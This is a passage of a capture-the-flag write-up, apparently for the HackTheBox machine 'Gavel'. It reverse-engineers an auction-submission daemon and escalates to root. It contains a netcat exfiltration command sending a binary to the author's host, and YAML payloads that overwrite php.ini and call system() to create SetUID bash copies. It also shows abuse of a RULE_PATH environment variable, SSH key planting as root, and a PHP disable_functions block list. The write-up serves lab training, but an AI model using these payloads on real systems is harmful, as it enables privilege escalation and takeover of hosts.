  if (file == (FILE *)0x0) goto LAB_0010192a;
  file_size = file_stat.st_size & 0xffffffff;
  file_buf = malloc(file_size);
  if (file_buf == (void *)0x0) {
    fclose(file);
    goto LAB_00101771;
  }
  bytes_read = fread(file_buf,1,file_size,file);
  if (file_size != bytes_read) {
    fclose(file);
    free(file_buf);
    goto LAB_00101771;
  }
  fclose(file);
```

The it calls `connect_sock()` to get a socket. Then it creates a JSON object and parses the YAML file into it, and then sending it over the socket:

```c
sock_fd = connect_sock();
      if (sock_fd < 0) {
LAB_00101915:
        do {
          die("failed to connect to %s\n","/var/run/gaveld.sock");
LAB_0010192a:
          perror("fopen");
LAB_00101771:
          die("failed to read %s\n",argv);
LAB_00101782:
          sock_fd = connect_sock();
        } while (sock_fd < 0);
        json_req = json_object_new_object();
        json_val = json_object_new_string(cmd_str);
        json_object_object_add(json_req,&op,json_val);
        json_val = json_object_new_string("");
        json_object_object_add(json_req,"flags",json_val);
        json_val = json_object_new_int(0);
        json_object_object_add(json_req,"content_length",json_val);
        json_val = collect_env();
        json_object_object_add(json_req,&env,json_val);
        send_header_and_content(sock_fd,json_req,0,0);
        json_object_put(json_req);
        response = (char *)recv_response(sock_fd);
        if (response != (char *)0x0) goto LAB_00101727;
        fwrite(&no_response_msg,1,0x15,stderr);
      }
```

All the commands jump to the end to print the response:

```c
LAB_00101727:
      puts(response);
      free(response);
    }
LAB_0010160e:
    close(sock_fd);
  }
```

The payload generated for “submit” is:

```
[4-byte big-endian length][JSON: {"op":"submit","content_length":N}][N bytes of YAML]
```

The first length only applies to the JSON data.

The other two commands are very similar, using the same socket code, just with different commands:

```c
else {
  cmd_str = "stats";
  exit_code = strcmp(response,"stats");
  if (exit_code == 0) goto LAB_00101782;
  cmd_str = "invoice";
  exit_code = strcmp(response,"invoice");
  if (exit_code != 0) goto LAB_0010173c;
  sock_fd = connect_sock();
  exit_code = 0;
  if (sock_fd < 0) goto LAB_00101915;
  json_req = json_object_new_object();
  json_val = json_object_new_string("invoice");
  json_object_object_add(json_req,&op,json_val);
  json_val = json_object_new_string("");
  json_object_object_add(json_req,"flags",json_val);
  json_val = json_object_new_int(0);
  json_object_object_add(json_req,"content_length",json_val);
  json_val = collect_env();
  json_object_object_add(json_req,&env,json_val);
  send_header_and_content(sock_fd,json_req,0,0);
  json_object_put(json_req);
  response = (char *)recv_response(sock_fd);
  if (response == (char *)0x0) {
    fwrite(&no_response_from_invoice_msg,1,0x21,stderr);
    goto LAB_0010160e;
  }
```

The on the wire structure is similar to “submit”, just without the YAML:

```
[4-byte big-endian length][JSON: {"op":"stats"}]
[4-byte big-endian length][JSON: {"op":"invoice"}]
```

`connect_sock()` just creates a connection to a UNIX socket at `/var/run/gaveld.sock`:

```c
int connect_sock(void)

{
  int sock_fd;
  int connect_ret;
  int result;
  long in_FS_OFFSET;

  }
  else {

    sun_addr._10_8_ = 0x2e646c657661672f;
    sun_path_end = 0;

  __stack_chk_fail();
}
```

The program is just a way to submit calls to the service run on `gaveld`.

### gaveld

#### Files

The server application consists of an ELF binary, a `submissions` directory, and a PHP config:

```
www-data@gavel:/opt/gavel$ file *
gaveld:      ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b8b1b784b45ddabaf9ca56b06b62d4f59f68a0d, for GNU/Linux 3.2.0, not stripped
sample.yaml: ASCII text
submission:  directory
www-data@gavel:/opt/gavel$ file .config/php/php.ini 
.config/php/php.ini: ASCII text
```

There’s also a sample input file, but this is actually more associated with `gavel-util`. I’ll dig into the PHP configuration shortly. The `sample.yaml` file looks like the information for an auction:

```yml
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

As noted above, this format doesn’t actually work for `gavel-util` without some modification.

#### Exfil

I’ll exfil this file the same way:

```
auctioneer@gavel:/$ md5sum /opt/gavel/gaveld 
ea2096a074a283828ae5615cddebc8e6  /opt/gavel/gaveld
auctioneer@gavel:/$ cat /opt/gavel/gaveld | nc 10.10.14.60 444
^C
```

At my host:

```
oxdf@hacky$ nc -lnvp 444 > gaveld
Listening on 0.0.0.0 444
Connection received on 10.129.15.156 56058
oxdf@hacky$ md5sum gaveld 
ea2096a074a283828ae5615cddebc8e6  gaveld
```

#### Reverse Engineering

I’ll load this program into [Ghidra](https://ghidra-sre.org/) as well. This program has only a few functions as well:

![image-20260306103504201](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260306103504201.webp)

The `main` function is responsible for setting up the listening socket:

```c
void main(void)

{
  uint pid;
  int listen_fd;
  int client_fd;
  __pid_t child_pid;
  time_t seed_time;
  group *grp;
  int *errno_ptr;
  __gid_t gid;
  long in_FS_OFFSET;
  sockaddr bind_addr [6];
  undefined1 addr_pad;
  undefined8 stack_canary;
  
  stack_canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  seed_time = time((time_t *)0x0);
  pid = getpid();
  srand(pid ^ (uint)seed_time);
  mkdir("/opt/gavel/submission",0x1e8);
  listen_fd = socket(1,1,0);
  if (listen_fd < 0) {
    perror("socket");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  unlink("/var/run/gaveld.sock");
  addr_pad = 0;
  bind_addr[0].sa_family = 1;
  strncpy(bind_addr[0].sa_data,"/var/run/gaveld.sock",0x6b);
  client_fd = bind(listen_fd,bind_addr,0x6e);
  if (client_fd < 0) {
    perror("bind");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  client_fd = listen(listen_fd,0x10);
  if (client_fd < 0) {
    perror("listen");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  grp = getgrnam("gavel-seller");
  if (grp == (group *)0x0) {
    __fprintf_chk(stderr,1,"Group %s not found, defaulting to root:root\n","gavel-seller");
    grp = getgrnam("root");
    gid = 0;
    if (grp == (group *)0x0) goto LAB_00102a7d;
  }
  gid = grp->gr_gid;
LAB_00102a7d:
  client_fd = chown("/var/run/gaveld.sock",0,gid);
  if (client_fd != 0) {
    perror("chown failed on socket");
  }
  client_fd = chmod("/var/run/gaveld.sock",0x1b0);
  if (client_fd != 0) {
    perror("chmod failed on socket");
  }
  while( true ) {
    while( true ) {
      while (client_fd = accept(listen_fd,(sockaddr *)0x0,(socklen_t *)0x0), client_fd < 0) {
        errno_ptr = __errno_location();
        if (*errno_ptr != 4) {
          perror("accept");
          sleep(1);
        }
      }
      child_pid = fork();
      if (-1 < child_pid) break;
      perror("fork");
      close(client_fd);
    }
    if (child_pid == 0) break;
    close(client_fd);
    do {
      child_pid = waitpid(-1,(int *)0x0,1);
    } while (0 < child_pid);
  }
  close(listen_fd);
  handle_conn();
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

This is a standard service pattern of listening on a socket (in this case a UNIX socket which is like a file), waiting in loop for connections, and when one comes, calling `fork` to start a new process to handle that connection, and in the original process closing the socket and going back to wait for more.

The socket used is `/var/run/gaveld.sock`, and the program changes the ownership to root:gavel-seller and sets so only root and that group can access it. It also seeds the random number generator and creates the `/opt/gavel/submission` directory. The connections are handled by `handle_conn`.

The decompile for `handle_conn` is 731 lines long, and it’s filled with some junk. The main points are:

- It uses `getsockopt(SO_PEERCRED)` to get the UID of the connecting process, which it looks up with `getpwuid` to make sure that they connecting user is in the gavel-seller group, and rejects otherwise.
- Reads a 4-byte big-endian length header, then reads that many bytes of JSON. Parses the JSON and extracts the op field (command) (and `content_length` if it’s there).
- It branches on the three commands:
	- “submit”
		- Receives YAML content (up to 2MB), parses it with libyaml, and validates that all 6 required keys (`name`, `description`, `image`, `price`, `rule_msg`, and `rule`) are present.
				- The rule string is copied (max 1024 bytes) and passed to `php_safe_run()` for sandbox validation (using `/opt/gavel/.config/php/php.ini`). If the rule passes (returns 0), the YAML is saved to `/opt/gavel/submission/<hex>.yaml` using a secure `mkstemp` and then `rename` pattern. If the rule fails, it sends back the sandbox error output.
		- “stats”
		- Connects to MySQL using the creds gavel:gavel.
				- Queries active auctions and recently ended auctions (last 3).
				- Formats a colored table, and sends it back.
		- “invoice”
		- Reads `/var/log/gavel_prod.log`, parsing lines matching `[+] Winner '<name>' received '<item>'` via `sscanf`.
				- Generates a timestamped invoice with all won items, sends it back, and also writes it to `invoice.txt`.

The `php_safe_run` function has a complex set of logic at the top that sets the PHP config file:

```c
env_ojbect = 0;
json_object_object_get_ex(param_1,&env,&env_ojbect);
if (((env_ojbect == 0) || (res = json_object_is_type(env_ojbect,4), res == 0)) ||
   (res = json_object_object_get_ex(env_ojbect,"RULE_PATH",&env_RULE_PATH_obj), res == 0)) {
  strncpy(php.ini-path,"/opt/gavel/.config/php/php.ini",0x1000);
  null = 0;
}
else {
  env_RULE_PATH_value = (char *)json_object_get_string(env_RULE_PATH_obj.rlim_cur);
  strncpy(php.ini-path,"/opt/gavel/.config/php/php.ini",0x1000);
  null = 0;
  if (((env_RULE_PATH_value != (char *)0x0) && (*env_RULE_PATH_value != '\0')) &&
     ((res = stat(env_RULE_PATH_value,(stat *)local_30d8), res == 0 &&
      (((local_30d8._24_4_ & 0xf000) == 0x8000 && (res = access(env_RULE_PATH_value,4), res == 0))
      )))) {
    strncpy(php.ini-path,env_RULE_PATH_value,0x1000);
    null = 0;
  }
}
```

This is something I missed at first, but if it is able to read a path from the `RULE_PATH` environment variable, it will use that instead of `/opt/gavel/.config/php/php.ini`, in the `strncpy` on the last meaningful line in the code above.

#### php.ini

The `php.ini` file defines what the PHP code passed in can do when it runs in the sandbox:

```bash
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```

The most important items as far as exploiting this are:

| Setting | Description |
| --- | --- |
| `open_basedir=/opt/gavel` | I will only be able to interact with files inside the root directory of `/opt/gavel`. |
| `allow_url_fopen/include=Off` | I can't access files remotely (like from my system). |
| `disable_functions` | See breakdown below. |

`disable_functions` break down into a few categories:

| Category | Disabled Functions |
| --- | --- |
| Command execution | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `proc_close`, `pcntl_exec`, `pcntl_fork` |
| Code injection | `eval`, `assert`, `create_function`, `preg_replace`, `dl`, `ini_set` |
| Deserialization / Inclusion | `unserialize`, `extract`, `include`, `require`, `require_once`, `include_once` |
| File / Network I/O | `file_get_contents`, `fopen`, `fsockopen`, `pfsockopen`, `stream_socket_client` |

### Exploits

I’ll show two ways to abuse this binary. The first is how I initially solved it, using two hops, first overwriting the `php.ini` file with one that allowed anything, and then running arbitrary PHP. The other is the intended way, seeing the `RULE_PATH` environment variable in the file and using that to point to a permissive `php.ini` file.

style identifier fill:#1d1d1d,color:#FFFFFFFF;
```

### Two Hop Exploit

#### Strategy

I have a simple path to inject PHP by sending YAML file with PHP in the `rule` field, and it will be run by `gaveld` with:

```c
execv("/usr/bin/php", ["/usr/bin/php", "-n", "-c", "/opt/gavel/.config/php/php.ini", "-d", "display_errors=1", "-r", <sandbox code>])
```

`-n` also means I can’t set an overriding `php.ini` file and use an environment variable to point at it, which means I’m locked at `/opt/gavel/.config/php/php.ini`.

The function that is not disabled in the `disable_functions` is `file_put_contents`, which means I can write within `/opt/gavel`. The binary also calls `execv` for each new submission, which means if I can change the `php.ini`, it will use the changed configuration on the next run. With an updated `php.ini` file, I’ll be able to run `system`, and use another run to get a shell as root.

#### Step 1: php.ini

I’ll write a YAML file that uses `file_put_contents` in the `rule` to overwrite the `php.ini` file:

```yml
name: "replace ini"
description: "pwn step 1"
image: "https://0xdf.gitlab.io/image.png"
price: 100000
rule_msg: "oops, new php.ini"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\nopen_basedir=\ndisable_functions=\n\"); return false;"
```

I’ll submit that:

```
auctioneer@gavel:/dev/shm$ gavel-util submit ini.yaml 
Item submitted for review in next auction
```

And now the `php.ini` file is my basic config:

```
auctioneer@gavel:/dev/shm$ cat /opt/gavel/.config/php/php.ini 
engine=On
open_basedir=
disable_functions=
```

#### Step 2: SetUID / SetGID bash

I’ll create a second YAML file:

```yml
name: "privesc"
description: "pwn step 2"
image: "https://0xdf.gitlab.io/image.png"
price: 100000
rule_msg: "oops, fancy bash"
rule: "system('cp /bin/bash /home/auctioneer/0xdf; chmod 6777 /home/auctioneer/0xdf;'); return false;"
```

This will create a SetUID / SetGID copy of `bash` in auctioneer’s home directory. Typically I would use `/tmp` or `/var/tmp`, but these don’t work for me, and I’ll dig into that in [Beyond Root](#beyond-root---tmp-sandboxes).

When I run this one, it reports success:

```
auctioneer@gavel:/dev/shm$ gavel-util submit setuid.yaml 
Item submitted for review in next auction
```

And there is a privileges `bash` in auctioneer’s home directory:

```
auctioneer@gavel:/dev/shm$ ls -l ~
total 1368
-rwsrwsrwx 1 root root       1396520 Mar  6 23:00 0xdf
-rw-r----- 1 root auctioneer      33 Mar  5 12:23 user.txt
```

I’ll run with `-p` to not drop privs, and get a root shell:

```
auctioneer@gavel:/dev/shm$ ~/0xdf -p
0xdf-5.1#
```

And `root.txt`:

```
0xdf-5.1# cat /root/root.txt
ac449272************************
```

### RULE\_PATH Exploit

I’ll write the same basic `php.ini` file in `/dev/shm`:

```
auctioneer@gavel:/dev/shm$ cat php.ini 
engine=On
open_basedir=
disable_functions=
```

I’ll also write a YAML file:

```yml
name: "privesc"
description: "pwn again"
image: "https://0xdf.gitlab.io/image.png"
price: 100000
rule_msg: "oops, fancy bash"
rule: "system('cp /bin/bash /home/auctioneer/0xdf2; chmod 6777 /home/auctioneer/0xdf2;'); return false;"
```

This one creates another SetUID / SetGID `bash`. If I try to run it normally, it fails:

```
auctioneer@gavel:/dev/shm$ gavel-util submit ./setuid.yaml 
Illegal rule or sandbox violation.
Warning: system() has been disabled for security reasons in Command line code on line 1
```

However, if I set the `RULE_PATH` environment variable, it works:

```
auctioneer@gavel:/dev/shm$ RULE_PATH=/dev/shm/php.ini gavel-util submit ./setuid.yaml 
Item submitted for review in next auction
```

And now `0xdf2` is present and SetUID / SetGID:

```
auctioneer@gavel:~$ ls -l 0xdf2 
-rwsrwsrwx 1 root root 1396520 Mar 11 00:29 0xdf2
```

And I can get a shell:

```
auctioneer@gavel:~$ ./0xdf2 -p
0xdf2-5.1#
```

## Beyond Root - tmp Sandboxes

The first time I attempted to run the second half of the root exploit, I targeted `/tmp/0xdf` for my resulting SetUID / SetGID `bash`:

```yml
name: "privesc"
description: "pwn step 2"
image: "https://0xdf.gitlab.io/image.png"
price: 100000
rule_msg: "oops, fancy bash"
rule: "system('cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf;'); return false;"
```

I’ll use `/tmp` because `/dev/shm` is mounted `nosuid`, whereas `/tmp` and `/var/tmp` are not:

```
auctioneer@gavel:/$ mount | grep -e shm -e /tmp
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
/dev/sda2 on /tmp type ext4 (rw,relatime)
/dev/sda2 on /var/tmp type ext4 (rw,relatime)
```

I’ll run it, but nothing happens. `/tmp` doesn’t show any payload. Even after getting a root shell with a privileged `bash` in `/home/auctioneer`, `/tmp` still looks empty:

```
0xdf-5.1# ls -l /tmp/
total 0
```

That should be a tip. `/tmp` is *rarely* ever completely empty. I’ll use this root shell to go into `/root/.ssh` and write an `authorized_keys` file with my SSH public key. Then I can get a shell as root over SSH:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@gavel.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-161-generic x86_64)
...[snip]...
root@gavel:~#
```

Not only is `0xdf` in `/tmp`, but it’s SetUID / SetGID:

```
root@gavel:/tmp# ls -l 
total 1384
-rwsrwsrwx 1 root root 1396520 Mar  6 23:04 0xdf
drwx------ 3 root root    4096 Mar  5 12:20 systemd-private-2834f7aebf294e4598d037a15eded699-apache2.service-TiPx9c
drwx------ 3 root root    4096 Mar  5 12:20 systemd-private-2834f7aebf294e4598d037a15eded699-ModemManager.service-XFiHHh
drwx------ 3 root root    4096 Mar  5 12:20 systemd-private-2834f7aebf294e4598d037a15eded699-systemd-logind.service-3Desce
drwx------ 3 root root    4096 Mar  5 12:20 systemd-private-2834f7aebf294e4598d037a15eded699-systemd-resolved.service-zyQ9Jf
drwx------ 3 root root    4096 Mar  5 21:22 systemd-private-2834f7aebf294e4598d037a15eded699-upower.service-mbFf7A
```

The issue is that Apache is running with `PrivateTmp`, which is set in the Apache service config:

```
root@gavel:/var/tmp# systemctl cat apache2
# /lib/systemd/system/apache2.service
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
root@gavel:/var/tmp# systemctl cat apache2 | cat
# /lib/systemd/system/apache2.service
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=https://httpd.apache.org/docs/2.4/

[Service]
Type=forking
Environment=APACHE_STARTED_BY_SYSTEMD=true
ExecStart=/usr/sbin/apachectl start
ExecStop=/usr/sbin/apachectl graceful-stop
ExecReload=/usr/sbin/apachectl graceful
KillMode=mixed
PrivateTmp=true
Restart=on-abort

[Install]
WantedBy=multi-user.target
```

So as www-data, or auctioneer when `su` is run as www-data, or even root when that process runs the SetUID / SetGID shell, all of these are locked into a private tmp. So that process has `/tmp/systemd-private-2834f7aebf294e4598d037a15eded699-apache2.service-TiPx9c` mounted over `/tmp` (there’s a similar behavior in `/var/tmp`).

`gaveld` doesn’t run in the same (or any) private `tmp`, so it just writes to `/tmp`. But as a process descending from Apache, I can’t access that folder, and thus I can’t see it.
